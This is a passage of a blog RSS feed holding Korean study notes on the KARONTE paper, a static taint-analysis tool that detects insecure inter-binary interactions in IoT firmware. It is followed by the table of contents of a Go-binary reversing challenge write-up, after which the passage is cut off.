&lt;h1 id=&quot;0-주안점&quot;&gt;0. 주안점&lt;/h1&gt;

&lt;p&gt;논문의 요지 → 1) 어떤 새로운 기술을 도입해 2) 이만큼의 향상된 결과를 냈다&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;즉, 논문의 핵심은 → ‘향상된 결과’를 낼 수 있었던 원인이 ‘어떤 기술’ 인가&lt;/li&gt;
  &lt;li&gt;추가로, ‘이만큼 향상됐음’의 근거는 무엇인가&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이번 논문 과제의 의도는 연구실이 기반하고 있는 연구 분야가 무엇인지 이해하는 것이라고 생각&lt;/p&gt;

&lt;p&gt;따라서 ‘기술’에 주안점을 두고 논문 리딩 진행&lt;/p&gt;

&lt;div class=&quot;notice--primary&quot;&gt;

&lt;p&gt;&lt;strong&gt;💡논문에서 내가 얻어야 할 것은? &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;→ 향상된 결과의 기반이 되었던 기술적 발전은 무엇인가?&lt;/p&gt;
&lt;ul&gt;
    &lt;li&gt;multiple binaries analysis + inter-binary data flow analysis&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;→ 그것은 어떤 아이디어에 기반하였는가?&lt;/p&gt;
&lt;ul&gt;
    &lt;li&gt;
        Modeling &amp;amp;Tracking &lt;strong&gt;multi-binary interactions&lt;/strong&gt;
    &lt;/li&gt;
    &lt;li&gt;
        &lt;strong&gt;IPC paradigm used in one firmware is likely to be finite(concept)&lt;/strong&gt;
        &lt;ul&gt;
            &lt;li&gt;
                &lt;strong&gt;한 바이너리의 data I/O 파악(mid-implementation)&lt;/strong&gt;
                → inter-binary data flow recovery
            &lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;
        by leveraging &lt;strong&gt;CPF(Communication Paradigm Finder) modules(Implementation)&lt;/strong&gt;
    &lt;/li&gt;
&lt;/ul&gt;

&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;시행착오&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Appendix가 기술set 설명과 매우 밀접해 보여, 원활한 이해를 위해 Approach Overview를 읽고 바로 Appendix를 읽었음.
    &lt;ul&gt;
      &lt;li&gt;그러나 Appendix는 핵심 기술의 component 레벨 요소에 관한 세부 설명이었음&lt;/li&gt;
      &lt;li&gt;즉 논문 본문을 다 읽고 Appendix를 읽는 것이 효율적이었음&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-introduction&quot;&gt;1. Introduction&lt;/h1&gt;

&lt;h2 id=&quot;11-abstract&quot;&gt;1.1. Abstract&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-26-KARONTE/image.png&quot; alt=&quot;image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;IoT devices - Software on these systems(Firmware)
    &lt;ul&gt;
      &lt;li&gt;Analysis challenged
        &lt;ul&gt;
          &lt;li&gt;Hardware-dependent&lt;/li&gt;
          &lt;li&gt;Not-standardized Environment → 1) unique &amp;amp; minimal 2) non-standard configurations&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Analysis complicated
        &lt;ul&gt;
          &lt;li&gt;Multiple Binaries
            &lt;ul&gt;
              &lt;li&gt;Addressing the communication between executables is complicated&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;KARONTE
    &lt;ul&gt;
      &lt;li&gt;Static&lt;/li&gt;
      &lt;li&gt;Modeling &amp;amp; Tracking &lt;strong&gt;multi-binary interactions&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Starting from taint information → insecure interactions → vulnerability identification&lt;/li&gt;
      &lt;li&gt;Evaluation
        &lt;ol&gt;
          &lt;li&gt;On Tracking&amp;amp;Constraining Multi-binary interactions abilities&lt;/li&gt;
          &lt;li&gt;On Scaling ability about:
            &lt;ol&gt;
              &lt;li&gt;firmwares with various size and complexity&lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-background&quot;&gt;2. Background&lt;/h1&gt;

&lt;h3 id=&quot;emersion-of-iot-devices&quot;&gt;Emersion of IoT devices&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Vast amount of IoT devices introduced new-coined threats into cybersecurity landscape&lt;/li&gt;
  &lt;li&gt;Techniques that are invented, especially in the perspective of unpacking binaries, were insufficient&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;constraint-of-traditional-analysis-techniques&quot;&gt;Constraint of traditional analysis techniques&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Interconnected components&lt;/strong&gt;(functionality based on multiple programs execution)&lt;/p&gt;

    &lt;p&gt;↔ analysis without accounting for the &lt;strong&gt;internal flow of data&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;→ Ignore &lt;strong&gt;meaningful constraints&lt;/strong&gt; arise from inter-binary communication&lt;/p&gt;

    &lt;p&gt;→ Inability to &lt;strong&gt;differentiate sources of input&lt;/strong&gt;(attacker-controlled or non-attacker-controlled)&lt;/p&gt;

    &lt;p&gt;→ Limited search performance that leads to uncovering &lt;strong&gt;only superficial bugs&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Hence&lt;/strong&gt;,&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Consideration about &lt;strong&gt;multiple binary execution&lt;/strong&gt; is necessary&lt;/li&gt;
  &lt;li&gt;Analysis on the &lt;strong&gt;data shared&lt;/strong&gt; among multiple binary is necessary&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;karonte&quot;&gt;KARONTE&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Static&lt;/li&gt;
  &lt;li&gt;Track data flow&lt;/li&gt;
  &lt;li&gt;Intuition:
    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;IPC paradigm used in one firmware is likely to be finite&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Derive commonalities in the paradigm set&lt;/li&gt;
      &lt;li&gt;Use the commonalities to detect input locations &amp;amp; inter-component interactions&lt;/li&gt;
      &lt;li&gt;Use the verified interactions to track inter-component data flow&lt;/li&gt;
      &lt;li&gt;Perform cross-binary taint analysis&lt;/li&gt;
      &lt;li&gt;Detect insecure uses(potential vulnerabilities)&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-approach-overview&quot;&gt;3. Approach Overview&lt;/h1&gt;

&lt;p&gt;여기 설명된 항목 정리하고 Appendix에 나온 거랑 매핑해서 정리하자&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-firmware-pre-processing&quot;&gt;3.1. Firmware Pre-processing&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;unpack firmware sample using ‘binwalk’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;32-border-binaries-discovery&quot;&gt;3.2. Border Binaries Discovery&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;‘Border Binary’: Binaries that export the device functionality to the outside world
    &lt;ul&gt;
      &lt;li&gt;Represents the point where accepts user requests &amp;amp; references user-controlled data&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;33-binary-dependency-graphbdg-recovery&quot;&gt;3.3. Binary Dependency Graph(BDG) Recovery&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;‘BDG’
    &lt;ul&gt;
      &lt;li&gt;Directed graph&lt;/li&gt;
      &lt;li&gt;Models communication among border binaries by leveraging &lt;strong&gt;CPF(Communication Paradigm Finder) modules&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;34-multi-binary-data-flow-analysis&quot;&gt;3.4. Multi-binary Data-flow Analysis&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;By using ‘static taint engine’, the KARONTE:
    &lt;ul&gt;
      &lt;li&gt;Tracks data propagation&lt;/li&gt;
      &lt;li&gt;Collects data constraints&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Simulate data propagation applying features gathered
    &lt;ul&gt;
      &lt;li&gt;from the target binary b to other binaries that have inbound edges from b&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;35-insecure-interactions-detection&quot;&gt;3.5. Insecure Interactions Detection&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Identifying security issues&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-border-binaries-discovery&quot;&gt;4. Border Binaries Discovery&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;5-binary-dependency-graph사실상-cpf가-핵심&quot;&gt;5. Binary Dependency Graph(사실상 CPF가 핵심)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;51-purpose-and-overview&quot;&gt;5.1. Purpose and Overview&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;BDG: detects data dependencies &amp;amp; model data propagation (setter binary → getter binary)&lt;/li&gt;
  &lt;li&gt;Challenges:
    &lt;ul&gt;
      &lt;li&gt;Inter-binary data propagation:
        &lt;ul&gt;
          &lt;li&gt;control flow information is useless because:
            &lt;ul&gt;
              &lt;li&gt;processes do NOT normally access other processes’ memory regions.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Solution:
    &lt;ol&gt;
      &lt;li&gt;Model IPC paradigms by using CPFes(Communication Paradigm Finders)&lt;/li&gt;
      &lt;li&gt;Use modeled paradigms to build a graph == BDG(Binary Dependency Graph)&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;52-communication-paradigm-finders&quot;&gt;5.2. Communication Paradigm Finders&lt;/h2&gt;

&lt;h3 id=&quot;objective&quot;&gt;Objective&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Detect &amp;amp; Describe specific IPC paradigm which binary uses to share data&lt;/li&gt;
  &lt;li&gt;1)  explore binary &amp;amp; program path → 2) Does the path contains the necessary code to share data through the communication paradigm? → 3) If so, conduct deeper analysis using techniques below → 4) create edges of BDG utilizing features distinguished
    &lt;ol&gt;
      &lt;li&gt;Data Key Recovery&lt;/li&gt;
      &lt;li&gt;Flow Direction Determination&lt;/li&gt;
      &lt;li&gt;Binary Set Magnification&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;key-functionalities&quot;&gt;Key Functionalities&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Data Key Recovery&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;referenced by the binary for IPCs&lt;/li&gt;
      &lt;li&gt;fundamental &amp;amp; essential → THE MOST IMPORTANT TECHNIQUE&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Flow Direction Determination(scope: one binary)
    &lt;ol&gt;
      &lt;li&gt;Role of each program points: ‘Setter’ &amp;amp; ‘Getter’&lt;/li&gt;
      &lt;li&gt;program points: access the data keys&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Binary Set Magnification(scope: whole firmware)
    &lt;ol&gt;
      &lt;li&gt;if any ‘binaries’ refer to the data keys → scheduled for further analysis&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;implementation&quot;&gt;Implementation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;‘Semantic CPF’: OS-Independent
    &lt;ul&gt;
      &lt;li&gt;Intuition: ‘Data Keys’ *IPC must rely on them *Often hard-coded in binaries&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;KARONTE uses:
    &lt;ul&gt;
      &lt;li&gt;Environment CPFes&lt;/li&gt;
      &lt;li&gt;File CPFes&lt;/li&gt;
      &lt;li&gt;Socket CPFes&lt;/li&gt;
      &lt;li&gt;Semantic CPFes&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;53-building-the-bdg&quot;&gt;5.3. Building the BDG&lt;/h2&gt;

&lt;p&gt;(시간이 부족한 관계로 우선순위 하강)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;6-static-taint-analysis&quot;&gt;6. Static Taint Analysis&lt;/h1&gt;

&lt;p&gt;The operation of the underlying taint engine&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;7-multi-binary-data-flow-analysis&quot;&gt;&lt;strong&gt;7. Multi-Binary Data-Flow Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;How KARONTE combines the taint engine with the BDG to do detection&lt;/p&gt;

&lt;p&gt;BDG&lt;/p&gt;

&lt;p&gt;BFG&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;71-key-insight--concepts&quot;&gt;7.1. Key Insight &amp;amp; Concepts&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Paths with fewer constraints on user data dd are more likely to expose vulnerabilities.&lt;/li&gt;
  &lt;li&gt;BFG: Extended version of the BDG in the direction of ‘least strict set of constraint applied to the data shared among multiple binaries’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;72-bfg-building&quot;&gt;7.2. BFG Building&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Initialization&lt;/li&gt;
  &lt;li&gt;Constraint Propagation&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;8-insecure-interations-detection&quot;&gt;8. Insecure Interations Detection&lt;/h1&gt;

&lt;p&gt;Detection Target:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Memory-Corruption bugs&lt;/li&gt;
  &lt;li&gt;DoS vulnerabilities&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;9-discussion&quot;&gt;9. Discussion&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;10-evaluation&quot;&gt;10. Evaluation&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;12-conclusion&quot;&gt;12. Conclusion&lt;/h1&gt;

&lt;p&gt;KARONTE: Detect insecure interactions among components of embedded firmware&lt;/p&gt;

&lt;p&gt;+) Emphasizing the effectiveness of KARONTE&lt;/p&gt;

&lt;p&gt;→ 어떻게 insecure interactions를 알아냈는지에 관해 설명할 수 있는 게 중요한 듯해, Evaluation 파트는 나중에 읽어보는 것으로 함&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;appendix&quot;&gt;Appendix&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Background를 읽으면서 이걸 같이 봐야 할 것 같음&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;a-functions-identification&quot;&gt;A. Functions Identification&lt;/h3&gt;

&lt;p&gt;3 types of functions is the goal of distinguishment&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;memcmp-like functions&lt;/strong&gt;&lt;/p&gt;

    &lt;p class=&quot;notice&quot;&gt;👥: sementically equvalent to memory comparisons&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;methodology&lt;/strong&gt;
        &lt;ol&gt;
          &lt;li&gt;If the target function $f$ contains at least one loop, then:
            &lt;ol&gt;
              &lt;li&gt;Scan the instructions in the body of the loop in the linear manner and list every program point $p$ which contains memory comparison instructions&lt;/li&gt;
              &lt;li&gt;Compute a static backward slice $p$ → $f$’s entry point&lt;/li&gt;
              &lt;li&gt;Inspect $f$’s args to clarify whether they could affect operands in $p$ and if so, then:
                &lt;ol&gt;
                  &lt;li&gt;$f$ becomes a candidate of memcmp-like functions&lt;/li&gt;
                  &lt;li&gt;Calculate the size of $f$(based on number of its basic blocks)&lt;/li&gt;
                  &lt;li&gt;Adopt &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BootStomp&lt;/code&gt;’s threshold to decrease the number of false positives&lt;/li&gt;
                &lt;/ol&gt;
              &lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;strlen-like functions&lt;/strong&gt;&lt;/p&gt;

    &lt;p class=&quot;notice&quot;&gt;👥: calculate the length of a buffer&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;methodology&lt;/strong&gt;
        &lt;ol&gt;
          &lt;li&gt;&lt;strong&gt;similar to memcmp-like function search&lt;/strong&gt; implementation + ‘the existence of &lt;strong&gt;counter&lt;/strong&gt;, which increases as the number of loop iteration goes’&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;memcpy-like functions&lt;/strong&gt;&lt;/p&gt;

    &lt;p class=&quot;notice&quot;&gt;👥: copy the content of a memory location to another&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;methodology&lt;/strong&gt;
        &lt;ol&gt;
          &lt;li&gt;same with the methodology of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bootstomp&lt;/code&gt;&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;function body is not available&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;Heuristically match strings on the name of the function&lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt;(opinion) It may become an armpit of this system&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Optimization strategy&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Harness function generation: abstract the functions described above to minimize the resource of repeated execution&lt;/p&gt;

        &lt;p&gt;→ mitigate the ‘path explosion problem’&lt;/p&gt;

        &lt;p&gt;→ speed up, without losing precision.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;b-border-binaries-discovery&quot;&gt;B. Border Binaries Discovery&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Connection mark → Flag&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Network mark → Counter&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Calculation Hardness: Connection mark »»»» Network mark&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Network mark calculation
    &lt;ol&gt;
      &lt;li&gt;Retrieve all the &lt;strong&gt;memory comparisons&lt;/strong&gt; within a binary == Assume these will &lt;strong&gt;refer to hard-coded network related strings&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;The strings mostly referred within &lt;strong&gt;the basic block(the call to the memory comparison, too)&lt;/strong&gt;&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Connenction mark calculation
    &lt;ol&gt;
      &lt;li&gt;Forward static taint analysis + Backward static taint analysis&lt;/li&gt;
      &lt;li&gt;Limitation on the {Number of functions analyzed, Time of symbolic exploration}&lt;/li&gt;
      &lt;li&gt;For the case of path(source-sink) exploration failed:
        &lt;ol&gt;
          &lt;li&gt;any imprecision from a function $f$ analysis⇒ analysis for $f$ is incomplete&lt;/li&gt;
          &lt;li&gt;over 50%(setted threshold) of experiments ends up in incomplete analysis, then:
            &lt;ol&gt;
              &lt;li&gt;conservatively set the connection mark.&lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Regarding OS dependency: if the OS is unknown, then simply set the connection mark.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Utilize the feature ‘cmp’ when calculating Parsing Score.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;c-communication-paradigm-finders&quot;&gt;C. Communication Paradigm Finders&lt;/h3&gt;

&lt;p&gt;&lt;mark&gt; Purpose of CPF: When recovering BDG(Binary Dependency Graph), by leveraging CPF, it becomes able to map inter-binary data flow.&lt;/mark&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Aspect&lt;/th&gt;
      &lt;th&gt;Environment CPF&lt;/th&gt;
      &lt;th&gt;Semantic CPF&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Trigger for Analysis&lt;/td&gt;
      &lt;td&gt;Calls that set/get environment variables or execute binaries.&lt;/td&gt;
      &lt;td&gt;Memory operations using hardcoded data keys as indices or references.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Primary Detection&lt;/td&gt;
      &lt;td&gt;Strings representing environment keys or binary names.&lt;/td&gt;
      &lt;td&gt;Functions setting or getting data based on predefined data keys.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Application Context&lt;/td&gt;
      &lt;td&gt;More suited for analyzing high-level OS interactions.&lt;/td&gt;
      &lt;td&gt;Ideal for low-level memory and firmware analysis.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;OS-dependent CPF: Environment CPF
    &lt;ol&gt;
      &lt;li&gt;Key Idea
        &lt;ol&gt;
          &lt;li&gt;Calling to a function setting (or getting) environment variables is almost necessary when sharing data through environment variables before executing another binary.
            &lt;ol&gt;
              &lt;li&gt;Binary Execution Block Searching&lt;/li&gt;
              &lt;li&gt;Path (entry-block) searching to find out program points calling environment variable setting functions&lt;/li&gt;
              &lt;li&gt;reach-def analysis on path(entry-point)  → arguments values determination&lt;/li&gt;
              &lt;li&gt;Determined values == ‘data keys’&lt;/li&gt;
              &lt;li&gt;
                &lt;ul&gt;
                  &lt;li&gt;‘Binary Set Magnification Functionality’ ⇒ reach-def analysis → arg strings collection → possible binary names inference&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;If binary names are unable to resolve → find all the binaries that rely on the data keys previously recovered.&lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Detection Focus
        &lt;ol&gt;
          &lt;li&gt;Program Path&lt;/li&gt;
          &lt;li&gt;Binary Level Interaction&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;OS-independent CPF: Semantic CPF
    &lt;ol&gt;
      &lt;li&gt;Key Idea
        &lt;ol&gt;
          &lt;li&gt;IPC often relies on predefined data keys, which is often hardcoded as constants.&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Detection Focus
        &lt;ol&gt;
          &lt;li&gt;Function-Level Data Flow&lt;/li&gt;
          &lt;li&gt;Memory Operations&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;d-binary-dependency-graph-algorithm&quot;&gt;D. Binary Dependency Graph Algorithm&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;e-static-taint-analysis&quot;&gt;E. Static Taint Analysis&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;f-multi-binary-data-flow-analysis&quot;&gt;F. Multi-binary Data-flow Analysis&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;g-vulnerability-example&quot;&gt;G. Vulnerability Example&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 25 Jan 2025 22:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/fuzzing/2025-01-26-KARONTE</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/fuzzing/2025-01-26-KARONTE</guid>
      </item>
    
      <item>
        <title>FIESTA2024 S2-1 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-golang이란&quot; id=&quot;markdown-toc-0-golang이란&quot;&gt;0. Golang이란&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-golang의-특징&quot; id=&quot;markdown-toc-01-golang의-특징&quot;&gt;0.1. Golang의 특징&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#011-개요&quot; id=&quot;markdown-toc-011-개요&quot;&gt;0.1.1. 개요&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#012-동시성-지원concurrency-링크&quot; id=&quot;markdown-toc-012-동시성-지원concurrency-링크&quot;&gt;0.1.2. 동시성 지원(Concurrency, 링크)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#013-표준-라이브러리&quot; id=&quot;markdown-toc-013-표준-라이브러리&quot;&gt;0.1.3. 표준 라이브러리&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-go-pe-섹션&quot; id=&quot;markdown-toc-02-go-pe-섹션&quot;&gt;0.2. Go PE 섹션&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-probexe-리버싱&quot; id=&quot;markdown-toc-1-probexe-리버싱&quot;&gt;1. prob.exe 리버싱&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#10-샌드박스-분석&quot; id=&quot;markdown-toc-10-샌드박스-분석&quot;&gt;1.0. 샌드박스 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#11-동적-분석-시도&quot; id=&quot;markdown-toc-11-동적-분석-시도&quot;&gt;1.1. 동적 분석 시도&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-정적-분석-시도&quot; id=&quot;markdown-toc-12-정적-분석-시도&quot;&gt;1.2. 정적 분석 시도&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-main-패키지-내-함수-간-콜-관계-분석&quot; id=&quot;markdown-toc-13-main-패키지-내-함수-간-콜-관계-분석&quot;&gt;1.3. main 패키지 내 함수 간 콜 관계 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#14-동적-분석&quot; id=&quot;markdown-toc-14-동적-분석&quot;&gt;1.4. 동적 분석&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#141-실패-기록&quot; id=&quot;markdown-toc-141-실패-기록&quot;&gt;1.4.1. 실패 기록&lt;/a&gt;&lt;/li&gt;
